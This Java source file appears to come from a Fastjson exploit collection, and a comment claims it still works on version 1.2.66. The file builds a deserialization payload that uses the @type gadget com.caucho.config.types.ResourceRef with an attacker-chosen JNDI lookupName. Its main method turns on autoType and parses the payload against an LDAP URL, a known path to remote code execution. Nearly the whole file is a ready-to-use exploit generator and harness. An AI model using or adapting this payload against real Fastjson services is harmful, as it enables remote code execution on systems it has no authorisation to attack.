package fastjsonExp;

import com.caucho.config.types.ResourceGroupConfig;
import com.caucho.config.types.ResourceRef;
import utils.FastjsonVersionCtr;
import utils.StringUtils;
import javax.enterprise.context.spi.CreationalContext;

/**
 * 完成
 * com.caucho.config
 * still work at fastjson 1.2.66
 */

public class EXP4caucho_quercus {

    public String JNDI_URL = "";
    public String payload = "{\"@type\":\"com.caucho.config.types.ResourceRef\",\"lookupName\": \"replace_here\", \"value\":null}";

    public  void actual_fun(String url) throws Exception {
        ResourceGroupConfig resourceRef = new ResourceRef();
        resourceRef.setLookupName(url);
        resourceRef.getValue();
    }
    public  void actual_fun() throws Exception {
        if(!StringUtils.isNull(this.JNDI_URL)){
            this.actual_fun(this.JNDI_URL);
        }
    }
    public EXP4caucho_quercus(){}
    public EXP4caucho_quercus(String uri){
        this.JNDI_URL = uri;
        this.payload = this.payload.replace("replace_here",uri);
    }
    public String getPayload(){
        System.out.println(this.payload);
        return this.payload;
    }
    public static void main(String[] args) throws Exception{
        FastjsonVersionCtr myFastjson = new FastjsonVersionCtr("1.2.66");
        myFastjson.mySetAutoType(true);
        EXP4caucho_quercus exp = new EXP4caucho_quercus("ldap://127.0.0.1:1389/run");
        myFastjson.myParseObject(exp.getPayload());
        //exp.actual_fun();
        myFastjson.clear();
    }
}
